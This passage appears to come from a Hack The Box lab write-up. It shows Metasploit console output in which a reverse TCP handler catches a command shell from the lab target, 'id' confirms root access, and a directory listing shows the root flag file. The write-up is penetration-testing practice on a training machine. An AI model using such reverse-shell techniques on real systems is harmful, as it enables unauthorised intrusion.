...
<br><font color="RoyalBlue">[*]</font> Started reverse TCP double handler on 10.10.14.14:4444 
...
<br><font color="RoyalBlue">[*]</font> Command shell session 1 opened (10.10.14.14:4444 -> 10.10.10.3:57285) at 2017-12-16 22:55:59 -0500

<br>id
<br>uid=0(root) gid=0(root)</p>
</div>
</font>

Now we have the root access, anyway It's optional if you really want a tty shell or not for this situation atleast and after that we will read the user and root flags.
...
<br>ls
<br>Desktop  reset_logs.sh  root.txt  vnc.log
...
<p><script src="https://www.hackthebox.eu/badge/966"></script></p>
